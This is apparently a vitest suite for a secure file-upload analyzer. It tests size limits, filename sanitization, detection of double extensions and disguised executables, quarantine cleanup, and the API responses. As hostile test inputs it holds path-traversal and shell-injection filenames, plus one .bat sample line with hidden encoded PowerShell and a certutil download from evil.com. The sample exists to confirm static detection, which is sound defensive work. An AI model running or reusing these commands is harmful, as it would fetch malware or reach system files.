import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import request from 'supertest';
import fs from 'fs';
import path from 'path';
import { createApp } from '../src/app';
import prisma from '../src/database/client';
import {
  secureFileAnalyzer,
  sanitizeUploadFilename,
  inspectDoubleExtension,
  validateFileUpload,
  quarantineStorage,
} from '../src/modules/file';

describe('Secure File Analysis & Sandboxed Inspection System', () => {
  const app = createApp();
  const testDir = path.resolve(__dirname, './temp_file_security_test');

  beforeAll(() => {
    if (!fs.existsSync(testDir)) {
      fs.mkdirSync(testDir, { recursive: true });
    }
  });

  afterAll(async () => {
    try {
      if (fs.existsSync(testDir)) {
        fs.rmSync(testDir, { recursive: true, force: true, maxRetries: 3, retryDelay: 100 });
      }
    } catch {
      // Ignored for Windows transient file locks
    }
    await prisma.$disconnect();
  });

  describe('1. File-Size Limits & Validation', () => {
    it('rejects empty 0-byte files with FILE_EMPTY error', async () => {
      const emptyPath = path.join(testDir, 'empty.txt');
      fs.writeFileSync(emptyPath, '');

      const res = await request(app)
        .post('/api/analyze/file')
        .attach('file', emptyPath);

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('FILE_EMPTY');
    });

    it('rejects files exceeding size limit', () => {
      const validation = validateFileUpload({
        originalname: 'huge_file.zip',
        size: 30 * 1024 * 1024, // 30 MB (exceeds 25 MB)
        mimetype: 'application/zip',
      });

      expect(validation.valid).toBe(false);
      expect(validation.error?.code).toBe('FILE_TOO_LARGE');
      expect(validation.error?.httpStatus).toBe(413);
    });
  });

  describe('2. Filename Sanitization & Path Traversal Prevention', () => {
    it('strips directory traversal paths (../../etc/passwd)', () => {
      const dangerous1 = '../../../../etc/passwd';
      const clean1 = sanitizeUploadFilename(dangerous1);
      expect(clean1).not.toContain('..');
      expect(clean1).not.toContain('/');
      expect(clean1).not.toContain('\\');
      expect(clean1).toBe('passwd');
    });

    it('strips windows traversal paths and illegal shell characters', () => {
      const dangerous2 = '..\\..\\windows\\system32\\calc.exe;&$|><';
      const clean2 = sanitizeUploadFilename(dangerous2);
      expect(clean2).not.toContain('..');
      expect(clean2).not.toContain(';');
      expect(clean2).not.toContain('&');
      expect(clean2).not.toContain('|');
    });

    it('strips null bytes and control characters', () => {
      const nullByteName = 'safe_document.pdf\0.exe';
      const clean = sanitizeUploadFilename(nullByteName);
      expect(clean).not.toContain('\0');
    });
  });

  describe('3. MIME/Type & Extension Validation & Double Extensions', () => {
    it('detects dangerous double extension (invoice.pdf.exe)', () => {
      const res = inspectDoubleExtension('urgent_invoice.pdf.exe');
      expect(res.isDoubleExtension).toBe(true);
      expect(res.actualExtension).toBe('exe');
      expect(res.disguisedExtension).toBe('pdf');
    });

    it('flags extension mismatch when Windows executable is disguised as PDF', async () => {
      const disguisedPath = path.join(testDir, 'fake_contract.pdf');
      // MZ header (DOS/PE executable magic bytes)
      const peBuffer = Buffer.concat([
        Buffer.from([0x4d, 0x5a]),
        Buffer.from('This program cannot be run in DOS mode.'),
      ]);
      fs.writeFileSync(disguisedPath, peBuffer);

      const result = await secureFileAnalyzer.analyze(disguisedPath, 'fake_contract.pdf', 'application/pdf', {
        autoCleanup: false,
      });

      expect(result.evidence.magic_bytes.is_mime_mismatch).toBe(true);
      expect(result.evidence.magic_bytes.detected_mime).toBe('application/x-dosexec');
      expect(result.risk_score).toBeGreaterThanOrEqual(75);
      expect(['High Risk', 'Critical Risk']).toContain(result.classification);
      expect(result.detected_indicators.some((i) => /Extension Spoofing|executable/i.test(i))).toBe(true);

      fs.unlinkSync(disguisedPath);
    });
  });

  describe('4. Quarantine Storage Isolation & Automatic Cleanup', () => {
    it('generates randomized quarantine filename without user input in disk name', () => {
      const { quarantinePath, quarantineId } = quarantineStorage.generateQuarantinePath('pdf');
      expect(path.dirname(quarantinePath)).toBe(quarantineStorage.quarantineDir);
      expect(path.basename(quarantinePath)).toMatch(/^quar_\d+_[a-f0-9]+\.pdf$/);
      expect(quarantineId).toMatch(/^quar_\d+_[a-f0-9]+$/);
    });

    it('automatically cleans up quarantined file after analysis completion', async () => {
      const tempSamplePath = path.join(quarantineStorage.quarantineDir, `cleanup_test_${Date.now()}.txt`);
      fs.writeFileSync(tempSamplePath, 'Sample text content for automatic cleanup test.');

      expect(fs.existsSync(tempSamplePath)).toBe(true);

      const result = await secureFileAnalyzer.analyze(tempSamplePath, 'sample.txt', 'text/plain', {
        autoCleanup: true,
      });

      expect(result).toBeDefined();
      // File must be erased automatically by finally block
      expect(fs.existsSync(tempSamplePath)).toBe(false);
    });
  });

  describe('5. Malware-Safe Sandboxed Processing (No Dangerous Execution)', () => {
    it('statically analyzes suspicious script commands without executing them', async () => {
      const scriptSample = path.join(testDir, 'suspicious_script.bat');
      fs.writeFileSync(
        scriptSample,
        'powershell.exe -enc AAAAA -w hidden -nop ; certutil -urlcache -split -f http://evil.com/mal.exe ; wscript.shell'
      );

      const result = await secureFileAnalyzer.analyze(scriptSample, 'script.bat', 'text/plain', {
        autoCleanup: false,
      });

      expect(result.risk_score).toBeGreaterThanOrEqual(70);
      expect(['High Risk', 'Critical Risk']).toContain(result.classification);
      expect(result.evidence.static_heuristics.has_embedded_scripts).toBe(true);
      expect(result.detected_indicators.length).toBeGreaterThan(0);

      fs.unlinkSync(scriptSample);
    });
  });

  describe('6. Return Contract Compliance (Exact 7 Required Fields)', () => {
    it('returns all 7 required fields: file_type, file_size, detected_indicators, risk_score, classification, evidence, recommended_action', async () => {
      const safePath = path.join(testDir, 'clean_doc.txt');
      fs.writeFileSync(safePath, 'Legitimate business memo text with normal content.');

      const result = await secureFileAnalyzer.analyze(safePath, 'clean_doc.txt', 'text/plain', {
        autoCleanup: false,
      });

      // 1. file_type
      expect(result).toHaveProperty('file_type');
      expect(typeof result.file_type).toBe('string');

      // 2. file_size
      expect(result).toHaveProperty('file_size');
      expect(typeof result.file_size).toBe('number');
      expect(result.file_size).toBeGreaterThan(0);

      // 3. detected_indicators
      expect(result).toHaveProperty('detected_indicators');
      expect(Array.isArray(result.detected_indicators)).toBe(true);

      // 4. risk_score
      expect(result).toHaveProperty('risk_score');
      expect(typeof result.risk_score).toBe('number');
      expect(result.risk_score).toBeGreaterThanOrEqual(0);
      expect(result.risk_score).toBeLessThanOrEqual(100);

      // 5. classification
      expect(result).toHaveProperty('classification');
      expect(['Low Risk', 'Mild Risk', 'Suspicious', 'High Risk', 'Critical Risk']).toContain(
        result.classification
      );

      // 6. evidence
      expect(result).toHaveProperty('evidence');
      expect(result.evidence).toHaveProperty('summary');
      expect(result.evidence).toHaveProperty('file_hashes');
      expect(result.evidence.file_hashes).toHaveProperty('sha256');

      // 7. recommended_action
      expect(result).toHaveProperty('recommended_action');
      expect(typeof result.recommended_action).toBe('string');
      expect(result.recommended_action.length).toBeGreaterThan(5);

      fs.unlinkSync(safePath);
    });
  });

  describe('7. API Endpoints for File Analysis', () => {
    it('POST /api/analyze/file?sync=true returns 200 with all 7 fields immediately', async () => {
      const samplePath = path.join(testDir, 'api_test.pdf');
      fs.writeFileSync(samplePath, '%PDF-1.4 Mock PDF header content for testing.');

      const res = await request(app)
        .post('/api/analyze/file?sync=true')
        .attach('file', samplePath);

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.file_type).toBeDefined();
      expect(res.body.file_size).toBeGreaterThan(0);
      expect(Array.isArray(res.body.detected_indicators)).toBe(true);
      expect(typeof res.body.risk_score).toBe('number');
      expect(res.body.classification).toBeDefined();
      expect(res.body.evidence).toBeDefined();
      expect(res.body.recommended_action).toBeDefined();
    });

    it('POST /api/files/analyze provides dedicated synchronous sandboxed analysis', async () => {
      const samplePath = path.join(testDir, 'direct_test.txt');
      fs.writeFileSync(samplePath, 'Direct file analysis test content.');

      const res = await request(app)
        .post('/api/files/analyze')
        .attach('file', samplePath);

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.file_type).toBeDefined();
      expect(res.body.file_size).toBeGreaterThan(0);
      expect(res.body.risk_score).toBeDefined();
      expect(res.body.classification).toBeDefined();
      expect(res.body.recommended_action).toBeDefined();
    });

    it('POST /api/analyze/file (async) accepts upload with 202 and GET /api/analysis/:id returns 7 fields', async () => {
      const samplePath = path.join(testDir, 'async_test.txt');
      fs.writeFileSync(samplePath, 'Async queue file content test.');

      const postRes = await request(app)
        .post('/api/analyze/file')
        .attach('file', samplePath);

      expect(postRes.status).toBe(202);
      expect(postRes.body.success).toBe(true);
      expect(postRes.body.id).toBeDefined();
      const scanId = postRes.body.id;

      // Wait a moment for local queue execution
      await new Promise((r) => setTimeout(r, 400));

      const getRes = await request(app).get(`/api/analysis/${scanId}`);
      expect(getRes.status).toBe(200);
      expect(getRes.body.success).toBe(true);
      if (getRes.body.status === 'COMPLETED') {
        expect(getRes.body.file_type).toBeDefined();
        expect(getRes.body.file_size).toBeGreaterThan(0);
        expect(getRes.body.classification).toBeDefined();
        expect(getRes.body.detected_indicators).toBeDefined();
        expect(getRes.body.recommended_action).toBeDefined();
      }
    });
  });
});
